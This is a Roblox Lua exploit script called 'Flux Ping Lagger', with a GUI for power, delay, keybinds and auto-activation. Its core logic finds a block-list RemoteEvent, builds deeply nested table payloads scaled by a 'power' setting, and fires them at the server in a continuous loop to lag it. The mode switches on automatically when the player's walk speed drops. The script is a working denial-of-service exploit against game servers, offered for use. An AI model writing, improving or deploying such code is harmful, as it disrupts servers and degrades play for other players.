-- Bless Ping Lagger + Auto Activate (Flux Style GUI)
-- PC + Controller keybind | Customizable | Auto-save | Auto Activate | AntiLag ready

local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local HttpService      = game:GetService("HttpService")
local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")

local plr              = Players.LocalPlayer
local plrGui           = plr:WaitForChild("PlayerGui")

-- ══════════════════════════════════════════════════════════════════════
-- CONFIG & SAVE
-- ══════════════════════════════════════════════════════════════════════
local CONFIG_FILE = "BlessPingLagger_Config.json"

local DEFAULT_CFG = {
    power         = 100000,
    interval      = 0.125,
    keybindKb     = "F",
    keybindGp     = "ButtonY",
    autoActivate  = true,
    antiLag       = false,
    uiSize        = 100,
}

local cfg = {
    power         = DEFAULT_CFG.power,
    interval      = DEFAULT_CFG.interval,
    keybindKb     = DEFAULT_CFG.keybindKb,
    keybindGp     = DEFAULT_CFG.keybindGp,
    autoActivate  = DEFAULT_CFG.autoActivate,
    antiLag       = DEFAULT_CFG.antiLag,
    uiSize        = DEFAULT_CFG.uiSize,
}

local function resolveKb(name)
    if not name or name == "" or name == "None" then return nil end
    local ok, val = pcall(function() return Enum.KeyCode[name] end)
    return (ok and val) or nil
end

local function saveConfig()
    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and encoded and writefile then
        pcall(writefile, CONFIG_FILE, encoded)
    end
end

local function loadConfig()
    if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
    if not ok or type(data) ~= "table" then return end

    cfg.power         = tonumber(data.power) or DEFAULT_CFG.power
    cfg.interval      = tonumber(data.interval) or DEFAULT_CFG.interval
    cfg.keybindKb     = type(data.keybindKb) == "string" and data.keybindKb or DEFAULT_CFG.keybindKb
    cfg.keybindGp     = type(data.keybindGp) == "string" and data.keybindGp or DEFAULT_CFG.keybindGp
    cfg.autoActivate  = type(data.autoActivate) == "boolean" and data.autoActivate or DEFAULT_CFG.autoActivate
    cfg.antiLag       = type(data.antiLag) == "boolean" and data.antiLag or DEFAULT_CFG.antiLag
    cfg.uiSize        = tonumber(data.uiSize) or DEFAULT_CFG.uiSize
end

loadConfig()

local active           = false
local listeningFor     = nil
local remote           = nil
local brainrotMode     = false
local lastBrainrotState = false
local manualOverride   = false
local isMinimized      = false

-- ══════════════════════════════════════════════════════════════════════
-- COLOURS (Flux style)
-- ══════════════════════════════════════════════════════════════════════
local C = {
    white   = Color3.fromRGB(255, 255, 255),
    offWhite= Color3.fromRGB(220, 220, 220),
    gray    = Color3.fromRGB(160, 160, 160),
    dark    = Color3.fromRGB(20, 20, 25),
    purple  = Color3.fromRGB(140, 80, 255),
    green   = Color3.fromRGB(80, 255, 120),
    red     = Color3.fromRGB(255, 70, 70),
    yellow  = Color3.fromRGB(255, 200, 80),
    inputBg = Color3.fromRGB(30, 30, 40),
    toggleOn= Color3.fromRGB(80, 255, 120),
    toggleOff= Color3.fromRGB(60, 60, 70),
}

-- ══════════════════════════════════════════════════════════════════════
-- DESTROY OLD GUI
-- ══════════════════════════════════════════════════════════════════════
for _, kid in pairs(plrGui:GetChildren()) do
    if kid.Name == "BlessPingLaggerGui" or kid.Name == "FluxPingLaggerGui" then
        kid:Destroy()
    end
end

local screen = Instance.new("ScreenGui")
screen.Name         = "FluxPingLaggerGui"
screen.ResetOnSpawn = false
screen.DisplayOrder = 15
screen.IgnoreGuiInset = true
screen.Parent       = plrGui

-- ══════════════════════════════════════════════════════════════════════
-- HELPERS
-- ══════════════════════════════════════════════════════════════════════
local function tw(obj, props, t)
    TweenService:Create(obj,
        TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        props):Play()
end

local function makeDraggable(frame)
    local dragging, dragStart, startPos
    frame.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1
        or i.UserInputType == Enum.UserInputType.Touch then
            dragging  = true
            dragStart = i.Position
            startPos  = frame.Position
            i.Changed:Connect(function()
                if i.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    frame.InputChanged:Connect(function(i)
        if dragging and (i.UserInputType == Enum.UserInputType.MouseMovement
                      or i.UserInputType == Enum.UserInputType.Touch) then
            local d = i.Position - dragStart
            frame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
end

local function isGamepad(kc)
    local n = kc.Name
    return n:sub(1,6)=="Button" or n:sub(1,10)=="Thumbstick"
        or n:sub(1,4)=="DPad" or n=="ButtonSelect" or n=="ButtonStart"
end

local BLACKLISTED = {
    [Enum.KeyCode.Escape]      = true,
    [Enum.KeyCode.LeftControl] = true,
    [Enum.KeyCode.Unknown]     = true,
}

-- ══════════════════════════════════════════════════════════════════════
-- ASSET IDs
-- ══════════════════════════════════════════════════════════════════════
local ASSET_OPEN   = "rbxassetid://118338031849701"
local ASSET_CLOSED = "rbxassetid://126797538009910"

-- Base sizes (will be scaled by uiSize)
local BASE_OPEN_W, BASE_OPEN_H = 280, 420
local BASE_CLOSED_W, BASE_CLOSED_H = 280, 90

local function getScale()
    return math.clamp(cfg.uiSize / 100, 0.6, 1.5)
end

-- ══════════════════════════════════════════════════════════════════════
-- MAIN FRAME (Image based)
-- ══════════════════════════════════════════════════════════════════════
local mainFrame = Instance.new("ImageLabel")
mainFrame.Name             = "MainFrame"
mainFrame.Size             = UDim2.new(0, BASE_OPEN_W, 0, BASE_OPEN_H)
mainFrame.Position         = UDim2.new(0.5, -BASE_OPEN_W/2, 0.5, -BASE_OPEN_H/2)
mainFrame.BackgroundTransparency = 1
mainFrame.Image            = ASSET_OPEN
mainFrame.ScaleType        = Enum.ScaleType.Fit
mainFrame.Active           = true
mainFrame.ClipsDescendants = true
mainFrame.Parent           = screen

makeDraggable(mainFrame)

-- Container for all interactive elements (so we can hide/show easily)
local content = Instance.new("Frame")
content.Name = "Content"
content.Size = UDim2.new(1, 0, 1, 0)
content.BackgroundTransparency = 1
content.Parent = mainFrame

-- ══════════════════════════════════════════════════════════════════════
-- HEADER / TITLE AREA
-- ══════════════════════════════════════════════════════════════════════
local titleLbl = Instance.new("TextLabel")
titleLbl.Name = "Title"
titleLbl.Size = UDim2.new(0.7, 0, 0, 22)
titleLbl.Position = UDim2.new(0.05, 0, 0.02, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "FLUX PING LAGGER"
titleLbl.TextColor3 = C.white
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 14
titleLbl.TextXAlignment = Enum.TextXAlignment.Left
titleLbl.Parent = content

-- Minimize / Expand button
local minBtn = Instance.new("TextButton")
minBtn.Name = "MinBtn"
minBtn.Size = UDim2.new(0, 28, 0, 28)
minBtn.Position = UDim2.new(1, -36, 0.015, 0)
minBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
minBtn.BackgroundTransparency = 0.3
minBtn.BorderSizePixel = 0
minBtn.Text = "-"
minBtn.TextColor3 = C.white
minBtn.Font = Enum.Font.GothamBlack
minBtn.TextSize = 18
minBtn.AutoButtonColor = false
minBtn.Parent = content
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)

-- UI SIZE row
local uiSizeLbl = Instance.new("TextLabel")
uiSizeLbl.Size = UDim2.new(0.35, 0, 0, 18)
uiSizeLbl.Position = UDim2.new(0.05, 0, 0.085, 0)
uiSizeLbl.BackgroundTransparency = 1
uiSizeLbl.Text = "UI SIZE"
uiSizeLbl.TextColor3 = C.offWhite
uiSizeLbl.Font = Enum.Font.GothamBold
uiSizeLbl.TextSize = 11
uiSizeLbl.TextXAlignment = Enum.TextXAlignment.Left
uiSizeLbl.Parent = content

local uiSizeValue = Instance.new("TextLabel")
uiSizeValue.Name = "UISizeValue"
uiSizeValue.Size = UDim2.new(0, 40, 0, 18)
uiSizeValue.Position = UDim2.new(0.38, 0, 0.085, 0)
uiSizeValue.BackgroundTransparency = 1
uiSizeValue.Text = tostring(cfg.uiSize)
uiSizeValue.TextColor3 = C.white
uiSizeValue.Font = Enum.Font.GothamBold
uiSizeValue.TextSize = 12
uiSizeValue.Parent = content

local uiMinus = Instance.new("TextButton")
uiMinus.Size = UDim2.new(0, 24, 0, 24)
uiMinus.Position = UDim2.new(0.55, 0, 0.078, 0)
uiMinus.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
uiMinus.BorderSizePixel = 0
uiMinus.Text = "-"
uiMinus.TextColor3 = C.white
uiMinus.Font = Enum.Font.GothamBlack
uiMinus.TextSize = 16
uiMinus.AutoButtonColor = false
uiMinus.Parent = content
Instance.new("UICorner", uiMinus).CornerRadius = UDim.new(0, 5)

local uiPlus = Instance.new("TextButton")
uiPlus.Size = UDim2.new(0, 24, 0, 24)
uiPlus.Position = UDim2.new(0.66, 0, 0.078, 0)
uiPlus.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
uiPlus.BorderSizePixel = 0
uiPlus.Text = "+"
uiPlus.TextColor3 = C.white
uiPlus.Font = Enum.Font.GothamBlack
uiPlus.TextSize = 16
uiPlus.AutoButtonColor = false
uiPlus.Parent = content
Instance.new("UICorner", uiPlus).CornerRadius = UDim.new(0, 5)

-- Discord
local discordLbl = Instance.new("TextLabel")
discordLbl.Size = UDim2.new(0.9, 0, 0, 16)
discordLbl.Position = UDim2.new(0.05, 0, 0.14, 0)
discordLbl.BackgroundTransparency = 1
discordLbl.Text = "discord.gg/fluxhub"
discordLbl.TextColor3 = C.gray
discordLbl.Font = Enum.Font.Gotham
discordLbl.TextSize = 11
discordLbl.TextXAlignment = Enum.TextXAlignment.Left
discordLbl.Parent = content

-- Keybind display (right side of header area)
local keybindDisplay = Instance.new("TextLabel")
keybindDisplay.Name = "KeybindDisplay"
keybindDisplay.Size = UDim2.new(0, 80, 0, 20)
keybindDisplay.Position = UDim2.new(1, -95, 0.085, 0)
keybindDisplay.BackgroundTransparency = 1
keybindDisplay.Text = cfg.keybindGp ~= "None" and cfg.keybindGp or (cfg.keybindKb ~= "None" and cfg.keybindKb or "None")
keybindDisplay.TextColor3 = C.yellow
keybindDisplay.Font = Enum.Font.GothamBold
keybindDisplay.TextSize = 12
keybindDisplay.TextXAlignment = Enum.TextXAlignment.Right
keybindDisplay.Parent = content

-- ══════════════════════════════════════════════════════════════════════
-- POWER
-- ══════════════════════════════════════════════════════════════════════
local powerLbl = Instance.new("TextLabel")
powerLbl.Size = UDim2.new(0.4, 0, 0, 16)
powerLbl.Position = UDim2.new(0.05, 0, 0.20, 0)
powerLbl.BackgroundTransparency = 1
powerLbl.Text = "POWER"
powerLbl.TextColor3 = C.offWhite
powerLbl.Font = Enum.Font.GothamBold
powerLbl.TextSize = 11
powerLbl.TextXAlignment = Enum.TextXAlignment.Left
powerLbl.Parent = content

local powerBox = Instance.new("TextBox")
powerBox.Name = "PowerBox"
powerBox.Size = UDim2.new(0.9, 0, 0, 32)
powerBox.Position = UDim2.new(0.05, 0, 0.24, 0)
powerBox.BackgroundColor3 = C.inputBg
powerBox.BackgroundTransparency = 0.3
powerBox.BorderSizePixel = 0
powerBox.Text = tostring(cfg.power)
powerBox.TextColor3 = C.white
powerBox.Font = Enum.Font.GothamBold
powerBox.TextSize = 14
powerBox.ClearTextOnFocus = false
powerBox.Parent = content
Instance.new("UICorner", powerBox).CornerRadius = UDim.new(0, 8)
local powerStroke = Instance.new("UIStroke", powerBox)
powerStroke.Color = C.purple
powerStroke.Thickness = 1.2
powerStroke.Transparency = 0.5

-- ══════════════════════════════════════════════════════════════════════
-- DELAY
-- ══════════════════════════════════════════════════════════════════════
local delayLbl = Instance.new("TextLabel")
delayLbl.Size = UDim2.new(0.4, 0, 0, 16)
delayLbl.Position = UDim2.new(0.05, 0, 0.34, 0)
delayLbl.BackgroundTransparency = 1
delayLbl.Text = "DELAY"
delayLbl.TextColor3 = C.offWhite
delayLbl.Font = Enum.Font.GothamBold
delayLbl.TextSize = 11
delayLbl.TextXAlignment = Enum.TextXAlignment.Left
delayLbl.Parent = content

local delayBox = Instance.new("TextBox")
delayBox.Name = "DelayBox"
delayBox.Size = UDim2.new(0.9, 0, 0, 32)
delayBox.Position = UDim2.new(0.05, 0, 0.38, 0)
delayBox.BackgroundColor3 = C.inputBg
delayBox.BackgroundTransparency = 0.3
delayBox.BorderSizePixel = 0
delayBox.Text = tostring(cfg.interval)
delayBox.TextColor3 = C.white
delayBox.Font = Enum.Font.GothamBold
delayBox.TextSize = 14
delayBox.ClearTextOnFocus = false
delayBox.Parent = content
Instance.new("UICorner", delayBox).CornerRadius = UDim.new(0, 8)
local delayStroke = Instance.new("UIStroke", delayBox)
delayStroke.Color = C.purple
delayStroke.Thickness = 1.2
delayStroke.Transparency = 0.5

-- ══════════════════════════════════════════════════════════════════════
-- TOGGLE BUILDER
-- ══════════════════════════════════════════════════════════════════════
local function makeToggle(name, yScale, initial, onToggle)
    local row = Instance.new("Frame")
    row.Name = name .. "Row"
    row.Size = UDim2.new(0.9, 0, 0, 28)
    row.Position = UDim2.new(0.05, 0, yScale, 0)
    row.BackgroundTransparency = 1
    row.Parent = content

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0.65, 0, 1, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = name
    lbl.TextColor3 = C.offWhite
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 12
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = row

    local track = Instance.new("Frame")
    track.Name = "Track"
    track.Size = UDim2.new(0, 48, 0, 24)
    track.Position = UDim2.new(1, -48, 0.5, -12)
    track.BackgroundColor3 = initial and C.toggleOn or C.toggleOff
    track.BorderSizePixel = 0
    track.Parent = row
    Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)

    local knob = Instance.new("Frame")
    knob.Name = "Knob"
    knob.Size = UDim2.new(0, 20, 0, 20)
    knob.Position = initial and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10)
    knob.BackgroundColor3 = C.white
    knob.BorderSizePixel = 0
    knob.Parent = track
    Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = ""
    btn.Parent = track

    local state = initial
    btn.MouseButton1Click:Connect(function()
        state = not state
        tw(track, {BackgroundColor3 = state and C.toggleOn or C.toggleOff}, 0.15)
        tw(knob, {Position = state and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10)}, 0.15)
        onToggle(state)
    end)

    return {
        set = function(v)
            state = v
            track.BackgroundColor3 = v and C.toggleOn or C.toggleOff
            knob.Position = v and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10)
        end,
        get = function() return state end
    }
end

local autoToggle = makeToggle("AUTO ACTIVATE", 0.48, cfg.autoActivate, function(v)
    cfg.autoActivate = v
    saveConfig()
end)

local antiLagToggle = makeToggle("ANTILAG", 0.56, cfg.antiLag, function(v)
    cfg.antiLag = v
    saveConfig()
    -- AntiLag logic will be added later when you provide the code
end)

-- ══════════════════════════════════════════════════════════════════════
-- BACKGROUND dropdown (visual only for now)
-- ══════════════════════════════════════════════════════════════════════
local bgLbl = Instance.new("TextLabel")
bgLbl.Size = UDim2.new(0.4, 0, 0, 16)
bgLbl.Position = UDim2.new(0.05, 0, 0.64, 0)
bgLbl.BackgroundTransparency = 1
bgLbl.Text = "BACKGROUND"
bgLbl.TextColor3 = C.offWhite
bgLbl.Font = Enum.Font.GothamBold
bgLbl.TextSize = 11
bgLbl.TextXAlignment = Enum.TextXAlignment.Left
bgLbl.Parent = content

local bgBtn = Instance.new("TextButton")
bgBtn.Size = UDim2.new(0.9, 0, 0, 28)
bgBtn.Position = UDim2.new(0.05, 0, 0.68, 0)
bgBtn.BackgroundColor3 = C.inputBg
bgBtn.BackgroundTransparency = 0.3
bgBtn.BorderSizePixel = 0
bgBtn.Text = "  Default  ▼"
bgBtn.TextColor3 = C.white
bgBtn.Font = Enum.Font.Gotham
bgBtn.TextSize = 12
bgBtn.TextXAlignment = Enum.TextXAlignment.Left
bgBtn.AutoButtonColor = false
bgBtn.Parent = content
Instance.new("UICorner", bgBtn).CornerRadius = UDim.new(0, 7)

-- ══════════════════════════════════════════════════════════════════════
-- BIG OFF / ON BUTTON
-- ══════════════════════════════════════════════════════════════════════
local mainBtn = Instance.new("TextButton")
mainBtn.Name = "MainToggle"
mainBtn.Size = UDim2.new(0.9, 0, 0, 42)
mainBtn.Position = UDim2.new(0.05, 0, 0.77, 0)
mainBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
mainBtn.BackgroundTransparency = 0.2
mainBtn.BorderSizePixel = 0
mainBtn.Text = "OFF"
mainBtn.TextColor3 = C.red
mainBtn.Font = Enum.Font.GothamBlack
mainBtn.TextSize = 18
mainBtn.AutoButtonColor = false
mainBtn.Parent = content
Instance.new("UICorner", mainBtn).CornerRadius = UDim.new(0, 10)
local mainBtnStroke = Instance.new("UIStroke", mainBtn)
mainBtnStroke.Color = C.red
mainBtnStroke.Thickness = 1.5
mainBtnStroke.Transparency = 0.3

-- ══════════════════════════════════════════════════════════════════════
-- SAVE CONFIG
-- ══════════════════════════════════════════════════════════════════════
local saveBtn = Instance.new("TextButton")
saveBtn.Name = "SaveConfig"
saveBtn.Size = UDim2.new(0.9, 0, 0, 32)
saveBtn.Position = UDim2.new(0.05, 0, 0.89, 0)
saveBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
saveBtn.BackgroundTransparency = 0.2
saveBtn.BorderSizePixel = 0
saveBtn.Text = "SAVE CONFIG"
saveBtn.TextColor3 = C.white
saveBtn.Font = Enum.Font.GothamBold
saveBtn.TextSize = 13
saveBtn.AutoButtonColor = false
saveBtn.Parent = content
Instance.new("UICorner", saveBtn).CornerRadius = UDim.new(0, 8)

-- ══════════════════════════════════════════════════════════════════════
-- APPLY UI SIZE
-- ══════════════════════════════════════════════════════════════════════
local function applyUISize()
    local s = getScale()
    if isMinimized then
        mainFrame.Size = UDim2.new(0, BASE_CLOSED_W * s, 0, BASE_CLOSED_H * s)
    else
        mainFrame.Size = UDim2.new(0, BASE_OPEN_W * s, 0, BASE_OPEN_H * s)
    end
    uiSizeValue.Text = tostring(cfg.uiSize)
end

uiMinus.MouseButton1Click:Connect(function()
    cfg.uiSize = math.max(60, cfg.uiSize - 5)
    applyUISize()
    saveConfig()
end)

uiPlus.MouseButton1Click:Connect(function()
    cfg.uiSize = math.min(150, cfg.uiSize + 5)
    applyUISize()
    saveConfig()
end)

-- ══════════════════════════════════════════════════════════════════════
-- MINIMIZE / EXPAND
-- ══════════════════════════════════════════════════════════════════════
local function setMinimized(state)
    isMinimized = state
    if state then
        mainFrame.Image = ASSET_CLOSED
        content.Visible = false
        -- Show only minimal elements on closed image if needed
        -- For now we hide content and change image
        minBtn.Text = "+"
        minBtn.Visible = true
        minBtn.Parent = mainFrame -- keep accessible
    else
        mainFrame.Image = ASSET_OPEN
        content.Visible = true
        minBtn.Text = "-"
        minBtn.Parent = content
    end
    applyUISize()
end

minBtn.MouseButton1Click:Connect(function()
    setMinimized(not isMinimized)
end)

-- ══════════════════════════════════════════════════════════════════════
-- INPUT HANDLERS (power / delay)
-- ══════════════════════════════════════════════════════════════════════
powerBox.FocusLost:Connect(function()
    local n = tonumber(powerBox.Text)
    if n then
        cfg.power = math.max(1, math.floor(n))
        powerBox.Text = tostring(cfg.power)
        saveConfig()
    else
        powerBox.Text = tostring(cfg.power)
    end
end)

delayBox.FocusLost:Connect(function()
    local n = tonumber(delayBox.Text)
    if n then
        cfg.interval = math.max(0.01, n)
        delayBox.Text = tostring(cfg.interval)
        saveConfig()
    else
        delayBox.Text = tostring(cfg.interval)
    end
end)

saveBtn.MouseButton1Click:Connect(function()
    saveConfig()
    -- visual feedback
    local old = saveBtn.Text
    saveBtn.Text = "SAVED!"
    task.delay(0.8, function()
        if saveBtn then saveBtn.Text = old end
    end)
end)

-- ══════════════════════════════════════════════════════════════════════
-- PING LAGGER LOGIC (same as original)
-- ══════════════════════════════════════════════════════════════════════
local function findRemote()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local remote
    for _, name in ipairs({"SetPlayerBlockList","UpdatePlayerBlockList","SetBlockList","UpdateBlockList"}) do
        local r = rrs:FindFirstChild(name)
        if r and r:IsA("RemoteEvent") then remote = r break end
    end
    if not remote then
        for _, c in ipairs(rrs:GetChildren()) do
            if c:IsA("RemoteEvent") and c.Name:find("Block") then remote = c break end
        end
    end
    return remote
end

remote = findRemote()

local function buildPayload(power)
    local main = {}
    local nested = {{}}
    local current = nested[1]
    for _ = 1, 186 do
        local n = {}
        table.insert(current, n)
        current = n
    end
    local maxRep = math.min(math.floor(power / 188), 10000)
    for _ = 1, maxRep do
        table.insert(main, nested)
    end
    return main
end

local function runPingLoop()
    local delay = cfg.interval
    while active and remote do
        local payload = buildPayload(cfg.power)
        local ok = pcall(function() remote:FireServer(payload) end)
        if not ok then
            delay = math.min(delay * 1.5, 0.5)
        else
            delay = math.max(delay * 0.995, 0.05)
        end
        task.wait(delay)
    end
end

local function updateMainButton()
    if active then
        mainBtn.Text = "ON"
        mainBtn.TextColor3 = C.green
        mainBtnStroke.Color = C.green
    else
        mainBtn.Text = "OFF"
        mainBtn.TextColor3 = C.red
        mainBtnStroke.Color = C.red
    end
end

local function flipLag(state, isManual)
    active = state

    if isManual then
        if brainrotMode then
            manualOverride = not state
        else
            manualOverride = false
        end
    end

    if active then
        if not remote then
            remote = findRemote()
            if not remote then
                active = false
                updateMainButton()
                return
            end
        end
        task.spawn(runPingLoop)
    end
    updateMainButton()
end

mainBtn.MouseButton1Click:Connect(function()
    flipLag(not active, true)
end)

-- ══════════════════════════════════════════════════════════════════════
-- AUTO ACTIVATE (Brainrot detection - WalkSpeed < 25)
-- ══════════════════════════════════════════════════════════════════════
RunService.Heartbeat:Connect(function()
    if not cfg.autoActivate then
        if brainrotMode then
            brainrotMode = false
            lastBrainrotState = false
        end
        return
    end

    local char = plr.Character
    if not char then return end
    local hum = char:FindFirstChild("Humanoid")
    if not hum then return end

    local hasBrainrot = hum.WalkSpeed < 25

    if hasBrainrot and not lastBrainrotState then
        brainrotMode = true
        lastBrainrotState = true
        manualOverride = false
        flipLag(true)
    elseif not hasBrainrot and lastBrainrotState then
        brainrotMode = false
        lastBrainrotState = false
        manualOverride = false
        flipLag(false)
    end
end)

-- ══════════════════════════════════════════════════════════════════════
-- INPUT HANDLER (keybinds + hide GUI)
-- ══════════════════════════════════════════════════════════════════════
local function updateKeybindDisplay()
    local txt = "None"
    if cfg.keybindGp and cfg.keybindGp ~= "None" then
        txt = cfg.keybindGp
    elseif cfg.keybindKb and cfg.keybindKb ~= "None" then
        txt = cfg.keybindKb
    end
    keybindDisplay.Text = txt
end

UserInputService.InputBegan:Connect(function(input, processed)
    local kc = input.KeyCode
    if kc == Enum.KeyCode.Unknown then return end

    local isGp = isGamepad(kc)
    local isKb = input.UserInputType == Enum.UserInputType.Keyboard

    if listeningFor then
        if kc == Enum.KeyCode.Escape then
            listeningFor = nil
            updateKeybindDisplay()
            return
        end
        if listeningFor == "kb" and isKb and not BLACKLISTED[kc] then
            cfg.keybindKb = kc.Name
            listeningFor = nil
            updateKeybindDisplay()
            saveConfig()
            return
        end
        if listeningFor == "gp" and isGp then
            cfg.keybindGp = kc.Name
            listeningFor = nil
            updateKeybindDisplay()
            saveConfig()
            return
        end
        return
    end

    if processed then return end

    -- LeftControl = hide/show entire GUI
    if kc == Enum.KeyCode.LeftControl then
        mainFrame.Visible = not mainFrame.Visible
        return
    end

    local kbEnum = resolveKb(cfg.keybindKb)
    local gpEnum = resolveKb(cfg.keybindGp)

    if (kbEnum and kc == kbEnum and isKb)
    or (gpEnum and kc == gpEnum and isGp) then
        flipLag(not active, true)
    end
end)

-- Initial setup
applyUISize()
updateKeybindDisplay()
updateMainButton()
autoToggle.set(cfg.autoActivate)
antiLagToggle.set(cfg.antiLag)

print("[Flux Ping Lagger] Loaded | Auto Activate + AntiLag ready")